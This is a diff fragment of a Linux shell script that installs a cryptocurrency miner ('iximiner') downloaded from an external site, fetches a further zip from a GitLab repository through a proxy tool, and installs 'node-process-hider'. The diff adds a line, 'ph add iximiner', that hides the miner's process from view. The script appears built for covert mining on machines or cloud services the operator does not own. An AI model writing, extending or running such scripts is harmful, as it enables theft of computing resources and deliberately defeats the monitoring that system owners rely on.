@@ -7,10 +7,6 @@ apt update -y;apt -y install binutils cmake build-essential screen unzip net-too
 
 sudo apt-get install -y nodejs
 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
 npm i -g node-process-hider
 
 wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux
@@ -46,7 +42,7 @@ echo ""
 
 echo " "
 echo " "
-
+ph add iximiner 
 
 ./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
